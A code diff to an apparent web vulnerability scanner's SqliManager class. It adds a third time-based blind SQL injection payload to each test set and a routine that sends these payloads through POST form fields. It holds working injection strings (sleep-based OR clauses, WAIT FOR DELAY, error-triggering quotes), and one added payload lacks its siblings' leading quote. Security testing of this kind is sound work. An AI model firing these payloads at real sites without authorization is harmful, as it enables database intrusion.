@@ -20,9 +20,12 @@ class SqliManager:
                                  'eval|internal|range|reference|syntax|type']
         self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
         self._time_based_payloads = [
-            {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\''},
-            {'TruePld': '\'OR(if(1=1,sleep(5),0))--%20-', 'FalsePld': '\'OR(if(1=2,sleep(5),0))--%20-'},
-            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01'},
+            {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\'',
+             'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\''},
+            {'TruePld': '\'OR(if(1=1,sleep(5),0))--%20-', 'FalsePld': '\'OR(if(1=2,sleep(5),0))--%20-',
+             'True2Pld': 'OR(if(2=2,sleep(5),0))--%20-'},
+            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01',
+             'True2Pld': '1; WAIT FOR DELAY \'00:00:08'},
         ]
         self._delay_in_seconds = 5
         self._request_handler = RequestHandler(cookies, headers)
@@ -42,7 +45,8 @@ class SqliManager:
 
             cache_manager.save_result(self._result, has_final_result=True)
 
-        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) SqliManager GET found {len(self._result)} items')
+        print(
+            f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) SqliManager GET found {len(self._result)} items')
 
     def check_form_requests(self, form_dtos: List[FormRequestDTO]):
 
@@ -70,6 +74,7 @@ class SqliManager:
 
                         response = self._request_handler.handle_request(dto.url, post_data=copy_form_params)
                         if response is None:
+                            copy_form_params[param] = prev_param
                             continue
 
                         need_to_discard_payload = self.__check_keywords(response,
@@ -80,6 +85,8 @@ class SqliManager:
 
                         if need_to_discard_payload:
                             copy_form_params[param] = prev_param
+                    for payloads in self._time_based_payloads:
+                        self.__send_form_time_based(payloads, form.params, param, dto.url)
 
             elif form.method_type == "GET":
                 parsed = urlparse.urlparse(dto.url)
@@ -138,10 +145,15 @@ class SqliManager:
                 new_route_parts[index] = payload_part
                 false_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
 
-                route_time_based_payloads.append([true_new_url, false_new_url])
+                payload_part = f'{part}{payloads["True2Pld"]}'
+                new_route_parts = deepcopy(route_parts)
+                new_route_parts[index] = payload_part
+                true2_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
+
+                route_time_based_payloads.append([true_new_url, false_new_url, true2_new_url])
 
         for payloads in route_time_based_payloads:
-            self.__send_time_based_request(payloads[0], payloads[1])
+            self.__send_time_based_request(payloads[0], payloads[1], payloads[2])
 
     def __check_get_params(self, dto: GetRequestDTO):
         error_based_payloads_urls = set()
@@ -155,7 +167,8 @@ class SqliManager:
             for payloads in self._time_based_payloads:
                 time_based_payloads_urls.add(
                     (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
-                     f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}'))
+                     f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}',
+                     f'{main_url_split[0]}{param_split[0]}={payloads["True2Pld"]}{main_url_split[1]}'))
 
             for payload in self._error_based_payloads:
                 error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')
@@ -164,7 +177,7 @@ class SqliManager:
             self.__send_error_based_request(payload, dto)
 
         for payloads in time_based_payloads_urls:
-            self.__send_time_based_request(payloads[0], payloads[1])
+            self.__send_time_based_request(payloads[0], payloads[1], payloads[2])
 
     def __send_error_based_request(self, url, dto: GetRequestDTO):
         try:
@@ -177,12 +190,12 @@ class SqliManager:
         except Exception as inst:
             print(f"Exception - ({url}) - {inst}")
 
-    def __send_time_based_request(self, true_payload, false_payload):
+    def __send_time_based_request(self, true_payload, false_payload, true_2payload):
         response1 = self._request_handler.handle_request(true_payload)
         if response1 is not None and response1.elapsed.total_seconds() >= self._delay_in_seconds:
             response2 = self._request_handler.handle_request(false_payload)
             if response2 is not None and response2.elapsed.total_seconds() < self._delay_in_seconds:
-                response3 = self._request_handler.handle_request(true_payload)
+                response3 = self._request_handler.handle_request(true_2payload)
                 if response3 is not None and response3.elapsed.total_seconds() >= self._delay_in_seconds:
                     msg = f"SQLiManager delay FOUND! TRUE:{true_payload} ; FALSE:{false_payload}"
                     print(msg)
@@ -217,7 +230,8 @@ class SqliManager:
                 if not any(dto.response_length == curr_resp_length and dto.details_msg == log_header_msg
                            for dto in self._result):
                     print(log_header_msg)
-                    self._result.append(InjectionFoundDTO(inj_type, url_payload, post_payload, web_page, log_header_msg))
+                    self._result.append(
+                        InjectionFoundDTO(inj_type, url_payload, post_payload, web_page, log_header_msg))
                 else:
                     print("Duplicate FORM SQLi: - " + url_payload)
 
@@ -228,3 +242,26 @@ class SqliManager:
                 need_to_discard_payload = True
 
         return need_to_discard_payload
+
+    def __send_form_time_based(self, payloads, form_params, param, url):
+        copy_form_params = deepcopy(form_params)
+        prev_param = copy_form_params[param]
+        copy_form_params[param] = payloads["TruePld"]
+        response1 = self._request_handler.handle_request(url, post_data=copy_form_params)
+        if response1 is not None and response1.elapsed.total_seconds() >= self._delay_in_seconds:
+
+            copy_form_params = deepcopy(form_params)
+            copy_form_params[param] = payloads["FalsePld"]
+            response2 = self._request_handler.handle_request(url, post_data=copy_form_params)
+            if response2 is not None and response2.elapsed.total_seconds() < self._delay_in_seconds:
+
+                copy_form_params = deepcopy(form_params)
+                copy_form_params[param] = payloads["True2Pld"]
+                response3 = self._request_handler.handle_request(url, post_data=copy_form_params)
+                if response3 is not None and response3.elapsed.total_seconds() >= self._delay_in_seconds:
+                    msg = f"SQLiManager FORM delay FOUND! TRUE:{payloads['TruePld']} ; FALSE:{payloads['FalsePld']}"
+                    print(msg)
+                    self._result.append(
+                        InjectionFoundDTO(InjectionType.Sqli_PostForm_Time, url, copy_form_params,
+                                          response1.text, msg))
+
